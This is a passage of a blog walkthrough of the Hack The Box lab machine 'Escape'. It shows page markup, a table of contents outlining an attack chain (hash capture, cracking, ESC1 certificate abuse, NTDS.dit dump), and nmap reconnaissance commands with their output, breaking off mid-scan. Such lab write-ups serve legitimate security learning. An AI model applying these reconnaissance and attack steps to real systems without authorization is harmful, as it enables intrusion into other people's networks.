<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.135.0">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Escape HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Escape HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Box Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/outdated-box/" title="./outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Escape HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.05.10"
                            >2024.05.10
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        25 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/medium/"
                            class="tag-btn">
                            Medium
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/ldap/"
                            class="tag-btn">
                            LDAP
                        </a>
                    
                        <a
                            href="/tags/mssql/"
                            class="tag-btn">
                            MSSQL
                        </a>
                    
                        <a
                            href="/tags/mysql/"
                            class="tag-btn">
                            MYSQL
                        </a>
                    
                        <a
                            href="/tags/ca/"
                            class="tag-btn">
                            CA
                        </a>
                    
                        <a
                            href="/tags/certificate/"
                            class="tag-btn">
                            CERTIFICATE
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/escape-box/" class="bread-btn">
    

    
        
            Escape HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#escape-hack-the-box-walkthrough-writeup">Escape Hack The Box Walkthrough/Writeup:</a></li>
    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#nmap">NMAP:</a></li>
        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
        <li><a href="#mssql-1433">MSSQL <code>1433</code>:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#connecting-to-the-mssql-instance-using-impacket-mssqlclient">Connecting to the MSSQL Instance using impacket-mssqlclient:</a></li>
        <li><a href="#enumerating-the-mssql-instance">Enumerating the MSSQL Instance:</a></li>
        <li><a href="#capturing-the-mssql-system-admin-hash-using-responder-and-xp-dirtree">Capturing the MSSQL System Admin hash using <a href="https://www.kali.org/tools/responder/">Responder</a> &amp; <code>xp_dirtree</code>:</a></li>
        <li><a href="#cracking-the-mssql-system-admin-using-hashcat">Cracking the MSSQL System Admin using <a href="https://www.kali.org/tools/hashcat/">Hashcat</a>:</a></li>
        <li><a href="#enumerating-smb-as-sql-svc-user">Enumerating SMB as <code>sql_svc</code> user:</a></li>
        <li><a href="#running-bloodhound-dot-py">Running bloodhound.py:</a></li>
        <li><a href="#connecting-to-the-mssql-as-sql-svc">Connecting to the MSSQL as <code>sql_svc</code>:</a></li>
        <li><a href="#finding-a-linked-sql-instance">Finding a linked SQL Instance:</a></li>
        <li><a href="#enumerating-the-host-using-xp-dirtree">Enumerating the Host Using <code>xp_dirtree</code>:</a></li>
        <li><a href="#downloading-errorlog-dot-bak-and-why-it-s-important-to-re-check-your-tools">Downloading <code>ERRORLOG.BAK</code> &amp; why it&rsquo;s important to re-check your tools:</a></li>
        <li><a href="#reading-errorlog-dot-bak-and-finding-credentials-for-ryan-dot-cooper">Reading <code>ERRORLOG.BAK</code> &amp; finding credentials for <code>Ryan.Cooper</code>:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
      <ul>
        <li><a href="#enumerating-the-host-as-ryan-dot-cooper">Enumerating the host as <code>Ryan.Cooper</code>:</a></li>
        <li><a href="#using-esc1-attack-chain-to-elevate-privileges-to-administrator">Using ESC1 Attack Chain to elevate privileges to Administrator:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-ownership">4. Ownership:</a>
      <ul>
        <li><a href="#dumping-ntds-dot-dit-database">Dumping <code>NTDS.dit</code> database:</a></li>
        <li><a href="#loading-dot-ccache-into-the-krb5ccname-variable-to-authenticate">Loading <code>.ccache</code> into the <code>KRB5CCNAME</code> Variable to Authenticate:</a></li>
      </ul>
    </li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="escape-hack-the-box-walkthrough-writeup">Escape Hack The Box Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/%3CBoxName%3E">https://app.hackthebox.com/machines/%3CBoxName%3E</a></li>
</ul>
<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</h2>
<ul>
<li><strong>Variables</strong>:
<ul>
<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
<ul>
<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
<ul>
<li><code>$box</code> = The IP of the box</li>
<li><code>$pass</code> = Passwords I have access to.</li>
<li><code>$user</code> = current user I am enumerating with.
<ul>
<li>Depending on where I am in the process this can change if I move laterally.</li>
</ul>
</li>
<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
</ul>
</li>
<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Wordlists</strong>:
<ul>
<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
<ul>
<li>I also use these additional wordlists:
<ul>
<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="nmap">NMAP:</h3>
<ul>
<li>
<p><strong>Basic Scan</strong>:</p>
<ul>
<li><code>nmap $box -Pn -oA basicScan</code>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20kali%20in%2046.02-HTB/BlogEntriesMade/Escape/scans/nmap%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%ef%95%99%2008:21:02%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-04%2008:21%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.228.253%0a%20%20Host%20is%20up%20%280.042s%20latency%29.%0a%20%20Not%20shown:%20988%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%0a%20%2053/tcp%20%20%20open%20%20domain%0a%20%2088/tcp%20%20%20open%20%20kerberos-sec%0a%20%20135/tcp%20%20open%20%20msrpc%0a%20%20139/tcp%20%20open%20%20netbios-ssn%0a%20%20389/tcp%20%20open%20%20ldap%0a%20%20445/tcp%20%20open%20%20microsoft-ds%0a%20%20464/tcp%20%20open%20%20kpasswd5%0a%20%20593/tcp%20%20open%20%20http-rpc-epmap%0a%20%20636/tcp%20%20open%20%20ldapssl%0a%20%201433/tcp%20open%20%20ms-sql-s%0a%20%203268/tcp%20open%20%20globalcatLDAP%0a%20%203269/tcp%20open%20%20globalcatLDAPssl%0a%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2012.52%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>   08:21:02 zsh ❯ nmap $box -Pn -oA basicScan
</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-04 08:21 BST
</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.253
</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">988</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>  53/tcp   open  domain
</span></span><span style="display:flex;"><span>  88/tcp   open  kerberos-sec
</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>  139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>  389/tcp  open  ldap
</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>  464/tcp  open  kpasswd5
</span></span><span style="display:flex;"><span>  593/tcp  open  http-rpc-epmap
</span></span><span style="display:flex;"><span>  636/tcp  open  ldapssl
</span></span><span style="display:flex;"><span>  1433/tcp open  ms-sql-s
</span></span><span style="display:flex;"><span>  3268/tcp open  globalcatLDAP
</span></span><span style="display:flex;"><span>  3269/tcp open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.52 seconds</span></span></code></pre></div>
    
</div>
</li>
<li><strong>Some interesting enumeration paths already</strong>:
<ul>
<li><code>53</code> - DNS:
<ul>
<li>We can check for interesting records:</li>
</ul>
</li>
<li><code>88</code> - Kerberos:
<ul>
<li>We can use kerbrute to bruteforce users using pre-auth.</li>
</ul>
</li>
<li><code>445</code> - Good ol&rsquo; smb:
<ul>
<li>We can check for null sessions.</li>
</ul>
</li>
<li><code>389</code> - LDAP:
<ul>
<li>We can check for anonymous binds and enumerate the domain.</li>
</ul>
</li>
<li><code>1443</code> - MSSQL:
<ul>
<li>A good target in general to go after.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>In depth scan</strong>:</p>
<ul>
<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%2046.02-HTB/BlogEntriesMade/Escape/scans/nmap%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2012s%0a%ef%95%99%2008:21:23%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-04%2008:21%20BST%0aNmap%20scan%20report%20for%2010.129.228.253%0aHost%20is%20up%20%280.038s%20latency%29.%0aNot%20shown:%2065515%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-10-04%2015:24:15Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%0a%7c%20Subject%20Alternative%20Name:%20DNS:dc.sequel.htb,%20DNS:sequel.htb,%20DNS:sequel%0a%7c%20Not%20valid%20before:%202024-01-18T23:03:57%0a%7c_Not%20valid%20after:%20%202074-01-05T23:03:57%0a%7c_ssl-date:%202024-10-04T15:25:48&#43;00:00;%20&#43;8h00m00s%20from%20scanner%20time.%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a464/tcp%20%20%20open%20%20kpasswd5?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%0a%7c%20Subject%20Alternative%20Name:%20DNS:dc.sequel.htb,%20DNS:sequel.htb,%20DNS:sequel%0a%7c%20Not%20valid%20before:%202024-01-18T23:03:57%0a%7c_Not%20valid%20after:%20%202074-01-05T23:03:57%0a%7c_ssl-date:%202024-10-04T15:25:48&#43;00:00;%20&#43;8h00m00s%20from%20scanner%20time.%0a1433/tcp%20%20open%20%20ms-sql-s%20%20%20%20%20%20Microsoft%20SQL%20Server%202019%2015.00.2000.00;%20RTM%0a%7c%20ms-sql-ntlm-info:%0a%7c%20%20%2010.129.228.253:1433:%0a%7c%20%20%20%20%20Target_Name:%20sequel%0a%7c%20%20%20%20%20NetBIOS_Domain_Name:%20sequel%0a%7c%20%20%20%20%20NetBIOS_Computer_Name:%20DC%0a%7c%20%20%20%20%20DNS_Domain_Name:%20sequel.htb%0a%7c%20%20%20%20%20DNS_Computer_Name:%20dc.sequel.htb%0a%7c%20%20%20%20%20DNS_Tree_Name:%20sequel.htb%0a%7c_%20%20%20%20Product_Version:%2010.0.17763%0a%7c%20ms-sql-info:%0a%7c%20%20%2010.129.228.253:1433:%0a%7c%20%20%20%20%20Version:%0a%7c%20%20%20%20%20%20%20name:%20Microsoft%20SQL%20Server%202019%20RTM%0a%7c%20%20%20%20%20%20%20number:%2015.00.2000.00%0a%7c%20%20%20%20%20%20%20Product:%20Microsoft%20SQL%20Server%202019%0a%7c%20%20%20%20%20%20%20Service%20pack%20level:%20RTM%0a%7c%20%20%20%20%20%20%20Post-SP%20patches%20applied:%20false%0a%7c_%20%20%20%20TCP%20port:%201433%0a%7c_ssl-date:%202024-10-04T15:25:48&#43;00:00;%20&#43;8h00m00s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=SSL_Self_Signed_Fallback%0a%7c%20Not%20valid%20before:%202024-10-04T15:17:39%0a%7c_Not%20valid%20after:%20%202054-10-04T15:17:39%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%0a%7c%20Subject%20Alternative%20Name:%20DNS:dc.sequel.htb,%20DNS:sequel.htb,%20DNS:sequel%0a%7c%20Not%20valid%20before:%202024-01-18T23:03:57%0a%7c_Not%20valid%20after:%20%202074-01-05T23:03:57%0a%7c_ssl-date:%202024-10-04T15:25:48&#43;00:00;%20&#43;8h00m00s%20from%20scanner%20time.%0a3269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%0a%7c%20Subject%20Alternative%20Name:%20DNS:dc.sequel.htb,%20DNS:sequel.htb,%20DNS:sequel%0a%7c%20Not%20valid%20before:%202024-01-18T23:03:57%0a%7c_Not%20valid%20after:%20%202074-01-05T23:03:57%0a%7c_ssl-date:%202024-10-04T15:25:48&#43;00:00;%20&#43;8h00m00s%20from%20scanner%20time.%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a9389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a49669/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49691/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a49694/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49712/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49722/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49743/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2889%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2889%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20DC;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c_clock-skew:%20mean:%207h59m59s,%20deviation:%200s,%20median:%207h59m59s%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-10-04T15:25:11%0a%7c_%20%20start_date:%20N/A%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20242.11%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 12s
</span></span><span style="display:flex;"><span> 08:21:23 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-04 08:21 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.253
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65515</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-04 15:24:15Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
</span></span><span style="display:flex;"><span>|_Not valid after:  2074-01-05T23:03:57
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
</span></span><span style="display:flex;"><span>|_Not valid after:  2074-01-05T23:03:57
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
